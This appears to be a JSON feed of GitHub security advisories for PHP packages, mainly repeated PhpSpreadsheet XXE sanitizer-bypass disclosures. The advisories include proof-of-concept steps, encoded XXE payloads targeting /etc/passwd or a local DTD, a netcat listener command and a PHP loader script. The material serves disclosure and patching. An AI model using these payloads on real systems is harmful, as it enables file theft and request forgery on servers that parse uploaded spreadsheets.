{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for PHP packages hosted at packagist.org",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Acomposer",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/composer.json",
    "description": "Security Advisory for PHP packages hosted at packagist.org on GitHub",
    "items": [
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Deserialization of untrusted data from the <code>mimes</code> parameter could lead to remote code execution.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Fixed in 3.0.9</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Not needed, a <code>composer update</code> will solve it in a non-breaking way.</p>\n<h3 id=\"references\">References</h3>\n<p>Reported responsibly <a href=\"https://github.com/catferq\">Vladislav Gladkiy</a> at <a href=\"https://www.ptsecurity.com/ww-en/\">Positive Technologies</a>.</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/Laravel-Backpack/FileManager/security/advisories/GHSA-8237-957h-h2c2\">https://github.com/Laravel-Backpack/FileManager/security/advisories/GHSA-8237-957h-h2c2</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-52306\">https://nvd.nist.gov/vuln/detail/CVE-2024-52306</a></li>\n<li><a href=\"https://github.com/Laravel-Backpack/FileManager/commit/2830498b85e05fb3c92179053b4d7c4a0fdb880b\">https://github.com/Laravel-Backpack/FileManager/commit/2830498b85e05fb3c92179053b4d7c4a0fdb880b</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-8237-957h-h2c2\">https://github.com/advisories/GHSA-8237-957h-h2c2</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-8237-957h-h2c2",
            "title": "[backpack/filemanager] FileManager Deserialization of Untrusted Data vulnerability",
            "date_modified": "2024-11-18T20:35:07.000Z",
            "date_published": "2024-11-13T18:43:02.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-8237-957h-h2c2"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Deserialization of untrusted data from the <code>mimes</code> parameter could lead to remote code execution.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Fixed in 3.0.9</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Not needed, a <code>composer update</code> will solve it in a non-breaking way.</p>\n<h3 id=\"references\">References</h3>\n<p>Reported responsibly <a href=\"https://github.com/catferq\">Vladislav Gladkiy</a> at <a href=\"https://www.ptsecurity.com/ww-en/\">Positive Technologies</a>.</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/Laravel-Backpack/FileManager/security/advisories/GHSA-8237-957h-h2c2\">https://github.com/Laravel-Backpack/FileManager/security/advisories/GHSA-8237-957h-h2c2</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-52306\">https://nvd.nist.gov/vuln/detail/CVE-2024-52306</a></li>\n<li><a href=\"https://github.com/Laravel-Backpack/FileManager/commit/2830498b85e05fb3c92179053b4d7c4a0fdb880b\">https://github.com/Laravel-Backpack/FileManager/commit/2830498b85e05fb3c92179053b4d7c4a0fdb880b</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-8237-957h-h2c2\">https://github.com/advisories/GHSA-8237-957h-h2c2</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-8237-957h-h2c2",
            "title": "[backpack/filemanager] FileManager Deserialization of Untrusted Data vulnerability",
            "date_modified": "2024-11-18T20:35:07.000Z",
            "date_published": "2024-11-13T18:43:02.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-8237-957h-h2c2"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The <a href=\"https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php\">XmlScanner class</a> has a <a href=\"https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php#L72\">scan</a> method which should prevent XXE attacks.</p>\n<p>However, we found another bypass than the previously reported <code>CVE-2024-47873</code>, the regexes from the <a href=\"https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php#L51\">findCharSet</a> method, which is used for determining the current encoding can be bypassed by using a payload in the encoding UTF-7, and adding at end of the file a comment with the value <code>encoding=\"UTF-8\"</code> with <code>\"</code>, which is matched by the first regex, so that <code>encoding='UTF-7'</code> with single quotes <code>'</code> in the XML header is not matched by the second regex: </p>\n<pre><code> $patterns = [\n            '/encoding\\\\s*=\\\\s*\"([^\"]*]?)\"/',\n            \"/encoding\\\\s*=\\\\s*'([^']*?)'/\",\n        ];\n</code></pre>\n<p>A payload for the <code>workbook.xml</code> file can for example be created with <a href=\"https://gchq.github.io/CyberChef/#recipe=Encode_text('UTF-7%20(65000)')&amp;input=Pz4KPCFET0NUWVBFIGZvbyBbCiAgPCFFTEVNRU5UIGZvbyBBTlkgPgogIDwhRU5USVRZIHh4ZSBTWVNURU0gImZpbGU6Ly8vZXRjL3Bhc3N3ZCIgPl0%2BCjxmb28%2BJnh4ZTs8L2Zvbz4K\">CyberChef</a>.\nIf you open an Excel file containing the payload from the link above stored in the <code>workbook.xml</code> file with PhpSpreadsheet, you will receive an HTTP request on <code>127.0.0.1:12345</code>. You can test that an HTTP request is created by running the <code>nc -nlvp 12345</code> command before opening the file containing the payload with PhpSpreadsheet.</p>\n<p>To create the payload you need:</p>\n<ol>\n<li>Create a file containing <code>&lt;?xml version = \"1.0\" encoding='UTF-7'</code> in an XML file</li>\n<li>Use the link attached above to create your XXE payload and add it to the XML file. </li>\n<li>Add <code>+ADw-+ACE---encoding=\"UTF-8\"--+AD4-</code> to the end of the XML file, which is matched by the first regex.</li>\n</ol>\n<h3 id=\"poc\">PoC</h3>\n<p><a href=\"https://github.com/user-attachments/files/17375792/payload.xlsx\">payload.xlsx</a></p>\n<ul>\n<li>Create a new folder.</li>\n<li>Run the <code>composer require phpoffice/phpspreadsheet</code> command in the new folder.</li>\n<li>Create an <code>index.php</code> file in that folder with the following content:</li>\n</ul>\n<pre><code class=\"language-PHP\">&lt;?php\nrequire 'vendor/autoload.php';\n\nuse PhpOffice\\PhpSpreadsheet\\Spreadsheet;\nuse PhpOffice\\PhpSpreadsheet\\Writer\\Xlsx;\n\n$spreadsheet = new Spreadsheet();\n\n$inputFileType = 'Xlsx';\n$inputFileName = './payload.xlsx';\n\n/**  Create a new Reader of the type defined in $inputFileType  **/\n$reader = \\PhpOffice\\PhpSpreadsheet\\IOFactory::createReader($inputFileType);\n/**  Advise the Reader that we only want to load cell data  **/\n$reader-&gt;setReadDataOnly(true);\n\n$worksheetData = $reader-&gt;listWorksheetInfo($inputFileName);\n\nforeach ($worksheetData as $worksheet) {\n\n$sheetName = $worksheet['worksheetName'];\n\necho \"&lt;h4&gt;$sheetName&lt;/h4&gt;\";\n/**  Load $inputFileName to a Spreadsheet Object  **/\n$reader-&gt;setLoadSheetsOnly($sheetName);\n$spreadsheet = $reader-&gt;load($inputFileName);\n\n$worksheet = $spreadsheet-&gt;getActiveSheet();\nprint_r($worksheet-&gt;toArray());\n\n}\n</code></pre>\n<ul>\n<li>Run the following command: <code>php -S 127.0.0.1:8080</code></li>\n<li>Add the <a href=\"https://github.com/user-attachments/files/17375792/payload.xlsx\">payload.xlsx</a> file in the folder and open <a href=\"https://127.0.0.1:8080\">https://127.0.0.1:8080</a> in a browser. You will see an HTTP request on netcat <a href=\"http://127.0.0.1:12345/ext.dtd\">http://127.0.0.1:12345/ext.dtd</a>.</li>\n</ul>\n<h3 id=\"impact\">Impact</h3>\n<p>An attacker can bypass the sanitizer and achieve an <a href=\"https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing\">XXE attack</a>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-7cc9-j4mv-vcjp\">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-7cc9-j4mv-vcjp</a></li>\n<li><a href=\"https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing\">https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7cc9-j4mv-vcjp\">https://github.com/advisories/GHSA-7cc9-j4mv-vcjp</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7cc9-j4mv-vcjp",
            "title": "[phpoffice/phpspreadsheet] XXE in PHPSpreadsheet's XLSX reader",
            "date_modified": "2024-11-18T20:01:49.000Z",
            "date_published": "2024-11-18T20:01:46.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7cc9-j4mv-vcjp"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The <a href=\"https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php\">XmlScanner class</a> has a <a href=\"https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php#L72\">scan</a> method which should prevent XXE attacks.</p>\n<p>However, we found another bypass than the previously reported <code>CVE-2024-47873</code>, the regexes from the <a href=\"https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php#L51\">findCharSet</a> method, which is used for determining the current encoding can be bypassed by using a payload in the encoding UTF-7, and adding at end of the file a comment with the value <code>encoding=\"UTF-8\"</code> with <code>\"</code>, which is matched by the first regex, so that <code>encoding='UTF-7'</code> with single quotes <code>'</code> in the XML header is not matched by the second regex: </p>\n<pre><code> $patterns = [\n            '/encoding\\\\s*=\\\\s*\"([^\"]*]?)\"/',\n            \"/encoding\\\\s*=\\\\s*'([^']*?)'/\",\n        ];\n</code></pre>\n<p>A payload for the <code>workbook.xml</code> file can for example be created with <a href=\"https://gchq.github.io/CyberChef/#recipe=Encode_text('UTF-7%20(65000)')&amp;input=Pz4KPCFET0NUWVBFIGZvbyBbCiAgPCFFTEVNRU5UIGZvbyBBTlkgPgogIDwhRU5USVRZIHh4ZSBTWVNURU0gImZpbGU6Ly8vZXRjL3Bhc3N3ZCIgPl0%2BCjxmb28%2BJnh4ZTs8L2Zvbz4K\">CyberChef</a>.\nIf you open an Excel file containing the payload from the link above stored in the <code>workbook.xml</code> file with PhpSpreadsheet, you will receive an HTTP request on <code>127.0.0.1:12345</code>. You can test that an HTTP request is created by running the <code>nc -nlvp 12345</code> command before opening the file containing the payload with PhpSpreadsheet.</p>\n<p>To create the payload you need:</p>\n<ol>\n<li>Create a file containing <code>&lt;?xml version = \"1.0\" encoding='UTF-7'</code> in an XML file</li>\n<li>Use the link attached above to create your XXE payload and add it to the XML file. </li>\n<li>Add <code>+ADw-+ACE---encoding=\"UTF-8\"--+AD4-</code> to the end of the XML file, which is matched by the first regex.</li>\n</ol>\n<h3 id=\"poc\">PoC</h3>\n<p><a href=\"https://github.com/user-attachments/files/17375792/payload.xlsx\">payload.xlsx</a></p>\n<ul>\n<li>Create a new folder.</li>\n<li>Run the <code>composer require phpoffice/phpspreadsheet</code> command in the new folder.</li>\n<li>Create an <code>index.php</code> file in that folder with the following content:</li>\n</ul>\n<pre><code class=\"language-PHP\">&lt;?php\nrequire 'vendor/autoload.php';\n\nuse PhpOffice\\PhpSpreadsheet\\Spreadsheet;\nuse PhpOffice\\PhpSpreadsheet\\Writer\\Xlsx;\n\n$spreadsheet = new Spreadsheet();\n\n$inputFileType = 'Xlsx';\n$inputFileName = './payload.xlsx';\n\n/**  Create a new Reader of the type defined in $inputFileType  **/\n$reader = \\PhpOffice\\PhpSpreadsheet\\IOFactory::createReader($inputFileType);\n/**  Advise the Reader that we only want to load cell data  **/\n$reader-&gt;setReadDataOnly(true);\n\n$worksheetData = $reader-&gt;listWorksheetInfo($inputFileName);\n\nforeach ($worksheetData as $worksheet) {\n\n$sheetName = $worksheet['worksheetName'];\n\necho \"&lt;h4&gt;$sheetName&lt;/h4&gt;\";\n/**  Load $inputFileName to a Spreadsheet Object  **/\n$reader-&gt;setLoadSheetsOnly($sheetName);\n$spreadsheet = $reader-&gt;load($inputFileName);\n\n$worksheet = $spreadsheet-&gt;getActiveSheet();\nprint_r($worksheet-&gt;toArray());\n\n}\n</code></pre>\n<ul>\n<li>Run the following command: <code>php -S 127.0.0.1:8080</code></li>\n<li>Add the <a href=\"https://github.com/user-attachments/files/17375792/payload.xlsx\">payload.xlsx</a> file in the folder and open <a href=\"https://127.0.0.1:8080\">https://127.0.0.1:8080</a> in a browser. You will see an HTTP request on netcat <a href=\"http://127.0.0.1:12345/ext.dtd\">http://127.0.0.1:12345/ext.dtd</a>.</li>\n</ul>\n<h3 id=\"impact\">Impact</h3>\n<p>An attacker can bypass the sanitizer and achieve an <a href=\"https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing\">XXE attack</a>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-7cc9-j4mv-vcjp\">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-7cc9-j4mv-vcjp</a></li>\n<li><a href=\"https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing\">https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7cc9-j4mv-vcjp\">https://github.com/advisories/GHSA-7cc9-j4mv-vcjp</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7cc9-j4mv-vcjp",
            "title": "[phpoffice/phpspreadsheet] XXE in PHPSpreadsheet's XLSX reader",
            "date_modified": "2024-11-18T20:01:49.000Z",
            "date_published": "2024-11-18T20:01:46.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7cc9-j4mv-vcjp"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The <a href=\"https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php\">XmlScanner class</a> has a <a href=\"https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php#L72\">scan</a> method which should prevent XXE attacks.</p>\n<p>However, we found another bypass than the previously reported <code>CVE-2024-47873</code>, the regexes from the <a href=\"https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php#L51\">findCharSet</a> method, which is used for determining the current encoding can be bypassed by using a payload in the encoding UTF-7, and adding at end of the file a comment with the value <code>encoding=\"UTF-8\"</code> with <code>\"</code>, which is matched by the first regex, so that <code>encoding='UTF-7'</code> with single quotes <code>'</code> in the XML header is not matched by the second regex: </p>\n<pre><code> $patterns = [\n            '/encoding\\\\s*=\\\\s*\"([^\"]*]?)\"/',\n            \"/encoding\\\\s*=\\\\s*'([^']*?)'/\",\n        ];\n</code></pre>\n<p>A payload for the <code>workbook.xml</code> file can for example be created with <a href=\"https://gchq.github.io/CyberChef/#recipe=Encode_text('UTF-7%20(65000)')&amp;input=Pz4KPCFET0NUWVBFIGZvbyBbCiAgPCFFTEVNRU5UIGZvbyBBTlkgPgogIDwhRU5USVRZIHh4ZSBTWVNURU0gImZpbGU6Ly8vZXRjL3Bhc3N3ZCIgPl0%2BCjxmb28%2BJnh4ZTs8L2Zvbz4K\">CyberChef</a>.\nIf you open an Excel file containing the payload from the link above stored in the <code>workbook.xml</code> file with PhpSpreadsheet, you will receive an HTTP request on <code>127.0.0.1:12345</code>. You can test that an HTTP request is created by running the <code>nc -nlvp 12345</code> command before opening the file containing the payload with PhpSpreadsheet.</p>\n<p>To create the payload you need:</p>\n<ol>\n<li>Create a file containing <code>&lt;?xml version = \"1.0\" encoding='UTF-7'</code> in an XML file</li>\n<li>Use the link attached above to create your XXE payload and add it to the XML file. </li>\n<li>Add <code>+ADw-+ACE---encoding=\"UTF-8\"--+AD4-</code> to the end of the XML file, which is matched by the first regex.</li>\n</ol>\n<h3 id=\"poc\">PoC</h3>\n<p><a href=\"https://github.com/user-attachments/files/17375792/payload.xlsx\">payload.xlsx</a></p>\n<ul>\n<li>Create a new folder.</li>\n<li>Run the <code>composer require phpoffice/phpspreadsheet</code> command in the new folder.</li>\n<li>Create an <code>index.php</code> file in that folder with the following content:</li>\n</ul>\n<pre><code class=\"language-PHP\">&lt;?php\nrequire 'vendor/autoload.php';\n\nuse PhpOffice\\PhpSpreadsheet\\Spreadsheet;\nuse PhpOffice\\PhpSpreadsheet\\Writer\\Xlsx;\n\n$spreadsheet = new Spreadsheet();\n\n$inputFileType = 'Xlsx';\n$inputFileName = './payload.xlsx';\n\n/**  Create a new Reader of the type defined in $inputFileType  **/\n$reader = \\PhpOffice\\PhpSpreadsheet\\IOFactory::createReader($inputFileType);\n/**  Advise the Reader that we only want to load cell data  **/\n$reader-&gt;setReadDataOnly(true);\n\n$worksheetData = $reader-&gt;listWorksheetInfo($inputFileName);\n\nforeach ($worksheetData as $worksheet) {\n\n$sheetName = $worksheet['worksheetName'];\n\necho \"&lt;h4&gt;$sheetName&lt;/h4&gt;\";\n/**  Load $inputFileName to a Spreadsheet Object  **/\n$reader-&gt;setLoadSheetsOnly($sheetName);\n$spreadsheet = $reader-&gt;load($inputFileName);\n\n$worksheet = $spreadsheet-&gt;getActiveSheet();\nprint_r($worksheet-&gt;toArray());\n\n}\n</code></pre>\n<ul>\n<li>Run the following command: <code>php -S 127.0.0.1:8080</code></li>\n<li>Add the <a href=\"https://github.com/user-attachments/files/17375792/payload.xlsx\">payload.xlsx</a> file in the folder and open <a href=\"https://127.0.0.1:8080\">https://127.0.0.1:8080</a> in a browser. You will see an HTTP request on netcat <a href=\"http://127.0.0.1:12345/ext.dtd\">http://127.0.0.1:12345/ext.dtd</a>.</li>\n</ul>\n<h3 id=\"impact\">Impact</h3>\n<p>An attacker can bypass the sanitizer and achieve an <a href=\"https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing\">XXE attack</a>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-7cc9-j4mv-vcjp\">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-7cc9-j4mv-vcjp</a></li>\n<li><a href=\"https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing\">https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7cc9-j4mv-vcjp\">https://github.com/advisories/GHSA-7cc9-j4mv-vcjp</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7cc9-j4mv-vcjp",
            "title": "[phpoffice/phpspreadsheet] XXE in PHPSpreadsheet's XLSX reader",
            "date_modified": "2024-11-18T20:01:49.000Z",
            "date_published": "2024-11-18T20:01:46.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7cc9-j4mv-vcjp"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The <a href=\"https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php\">XmlScanner class</a> has a <a href=\"https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php#L72\">scan</a> method which should prevent XXE attacks.</p>\n<p>However, we found another bypass than the previously reported <code>CVE-2024-47873</code>, the regexes from the <a href=\"https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php#L51\">findCharSet</a> method, which is used for determining the current encoding can be bypassed by using a payload in the encoding UTF-7, and adding at end of the file a comment with the value <code>encoding=\"UTF-8\"</code> with <code>\"</code>, which is matched by the first regex, so that <code>encoding='UTF-7'</code> with single quotes <code>'</code> in the XML header is not matched by the second regex: </p>\n<pre><code> $patterns = [\n            '/encoding\\\\s*=\\\\s*\"([^\"]*]?)\"/',\n            \"/encoding\\\\s*=\\\\s*'([^']*?)'/\",\n        ];\n</code></pre>\n<p>A payload for the <code>workbook.xml</code> file can for example be created with <a href=\"https://gchq.github.io/CyberChef/#recipe=Encode_text('UTF-7%20(65000)')&amp;input=Pz4KPCFET0NUWVBFIGZvbyBbCiAgPCFFTEVNRU5UIGZvbyBBTlkgPgogIDwhRU5USVRZIHh4ZSBTWVNURU0gImZpbGU6Ly8vZXRjL3Bhc3N3ZCIgPl0%2BCjxmb28%2BJnh4ZTs8L2Zvbz4K\">CyberChef</a>.\nIf you open an Excel file containing the payload from the link above stored in the <code>workbook.xml</code> file with PhpSpreadsheet, you will receive an HTTP request on <code>127.0.0.1:12345</code>. You can test that an HTTP request is created by running the <code>nc -nlvp 12345</code> command before opening the file containing the payload with PhpSpreadsheet.</p>\n<p>To create the payload you need:</p>\n<ol>\n<li>Create a file containing <code>&lt;?xml version = \"1.0\" encoding='UTF-7'</code> in an XML file</li>\n<li>Use the link attached above to create your XXE payload and add it to the XML file. </li>\n<li>Add <code>+ADw-+ACE---encoding=\"UTF-8\"--+AD4-</code> to the end of the XML file, which is matched by the first regex.</li>\n</ol>\n<h3 id=\"poc\">PoC</h3>\n<p><a href=\"https://github.com/user-attachments/files/17375792/payload.xlsx\">payload.xlsx</a></p>\n<ul>\n<li>Create a new folder.</li>\n<li>Run the <code>composer require phpoffice/phpspreadsheet</code> command in the new folder.</li>\n<li>Create an <code>index.php</code> file in that folder with the following content:</li>\n</ul>\n<pre><code class=\"language-PHP\">&lt;?php\nrequire 'vendor/autoload.php';\n\nuse PhpOffice\\PhpSpreadsheet\\Spreadsheet;\nuse PhpOffice\\PhpSpreadsheet\\Writer\\Xlsx;\n\n$spreadsheet = new Spreadsheet();\n\n$inputFileType = 'Xlsx';\n$inputFileName = './payload.xlsx';\n\n/**  Create a new Reader of the type defined in $inputFileType  **/\n$reader = \\PhpOffice\\PhpSpreadsheet\\IOFactory::createReader($inputFileType);\n/**  Advise the Reader that we only want to load cell data  **/\n$reader-&gt;setReadDataOnly(true);\n\n$worksheetData = $reader-&gt;listWorksheetInfo($inputFileName);\n\nforeach ($worksheetData as $worksheet) {\n\n$sheetName = $worksheet['worksheetName'];\n\necho \"&lt;h4&gt;$sheetName&lt;/h4&gt;\";\n/**  Load $inputFileName to a Spreadsheet Object  **/\n$reader-&gt;setLoadSheetsOnly($sheetName);\n$spreadsheet = $reader-&gt;load($inputFileName);\n\n$worksheet = $spreadsheet-&gt;getActiveSheet();\nprint_r($worksheet-&gt;toArray());\n\n}\n</code></pre>\n<ul>\n<li>Run the following command: <code>php -S 127.0.0.1:8080</code></li>\n<li>Add the <a href=\"https://github.com/user-attachments/files/17375792/payload.xlsx\">payload.xlsx</a> file in the folder and open <a href=\"https://127.0.0.1:8080\">https://127.0.0.1:8080</a> in a browser. You will see an HTTP request on netcat <a href=\"http://127.0.0.1:12345/ext.dtd\">http://127.0.0.1:12345/ext.dtd</a>.</li>\n</ul>\n<h3 id=\"impact\">Impact</h3>\n<p>An attacker can bypass the sanitizer and achieve an <a href=\"https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing\">XXE attack</a>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-7cc9-j4mv-vcjp\">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-7cc9-j4mv-vcjp</a></li>\n<li><a href=\"https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing\">https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7cc9-j4mv-vcjp\">https://github.com/advisories/GHSA-7cc9-j4mv-vcjp</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7cc9-j4mv-vcjp",
            "title": "[phpoffice/phpspreadsheet] XXE in PHPSpreadsheet's XLSX reader",
            "date_modified": "2024-11-18T20:01:49.000Z",
            "date_published": "2024-11-18T20:01:46.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7cc9-j4mv-vcjp"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The <a href=\"https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php\">XmlScanner class</a> has a <a href=\"https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php#L72\">scan</a> method which should prevent XXE attacks.</p>\n<p>However, the regexes used in the <code>scan</code> method and the <a href=\"https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php#L51\">findCharSet</a> method can be bypassed by using UCS-4 and encoding guessing as described in <a href=\"https://www.w3.org/TR/xml/#sec-guessing-no-ext-info\">https://www.w3.org/TR/xml/#sec-guessing-no-ext-info</a>.</p>\n<h3 id=\"details\">Details</h3>\n<p>The <code>scan</code> method converts the input in the UTF-8 encoding if it is not already in the UTF-8 encoding with the <a href=\"https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php#L76\"><code>toUtf8</code> method</a>.\nThen, the <code>scan</code> method uses a <a href=\"https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php#L79\">regex</a> which would also work with 16-bit encoding.</p>\n<p>However, the regexes from the <a href=\"https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php#L51\">findCharSet</a> method, which is used for determining the current encoding can be bypassed by using an encoding which has more than 8 bits, since the regex does not expect null bytes, and the XML library will also autodetect the encoding as described in <a href=\"https://www.w3.org/TR/xml/#sec-guessing-no-ext-info\">https://www.w3.org/TR/xml/#sec-guessing-no-ext-info</a>.</p>\n<p>A payload for the <code>workbook.xml</code> file can for example be created with <a href=\"https://gchq.github.io/CyberChef/#recipe=Encode_text('UTF-32BE%20(12001)')&amp;input=PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTE2IiBzdGFuZGFsb25lPSJ5ZXMiPz4KPCFET0NUWVBFIG1lc3NhZ2UgWwogICAgPCFFTlRJVFkgJSBleHQgU1lTVEVNICJodHRwOi8vMTI3LjAuMC4xOjEyMzQ1L2V4dC5kdGQiPgogICAgJWV4dDsKXT4KPHdvcmtib29rIHhtbG5zPSJodHRwOi8vc2NoZW1hcy5vcGVueG1sZm9ybWF0cy5vcmcvc3ByZWFkc2hlZXRtbC8yMDA2L21haW4iIHhtbG5zOnI9Imh0dHA6Ly9zY2hlbWFzLm9wZW54bWxmb3JtYXRzLm9yZy9vZmZpY2VEb2N1bWVudC8yMDA2L3JlbGF0aW9uc2hpcHMiPjxmaWxlVmVyc2lvbiBhcHBOYW1lPSJDYWxjIi8%2BPHdvcmtib29rUHIgYmFja3VwRmlsZT0iZmFsc2UiIHNob3dPYmplY3RzPSJhbGwiIGRhdGUxOTA0PSJmYWxzZSIvPjx3b3JrYm9va1Byb3RlY3Rpb24vPjxib29rVmlld3M%2BPHdvcmtib29rVmlldyBzaG93SG9yaXpvbnRhbFNjcm9sbD0idHJ1ZSIgc2hvd1ZlcnRpY2FsU2Nyb2xsPSJ0cnVlIiBzaG93U2hlZXRUYWJzPSJ0cnVlIiB4V2luZG93PSIwIiB5V2luZG93PSIwIiB3aW5kb3dXaWR0aD0iMTYzODQiIHdpbmRvd0hlaWdodD0iODE5MiIgdGFiUmF0aW89IjUwMCIgZmlyc3RTaGVldD0iMCIgYWN0aXZlVGFiPSIwIi8%2BPC9ib29rVmlld3M%2BPHNoZWV0cz48c2hlZXQgbmFtZT0iU2hlZXQxIiBzaGVldElkPSIxIiBzdGF0ZT0idmlzaWJsZSIgcjppZD0icklkMiIvPjwvc2hlZXRzPjxjYWxjUHIgaXRlcmF0ZUNvdW50PSIxMDAiIHJlZk1vZGU9IkExIiBpdGVyYXRlPSJmYWxzZSIgaXRlcmF0ZURlbHRhPSIwLjAwMSIvPjxleHRMc3Q%2BPGV4dCB4bWxuczpsb2V4dD0iaHR0cDovL3NjaGVtYXMubGlicmVvZmZpY2Uub3JnLyIgdXJpPSJ7NzYyNkM4Nj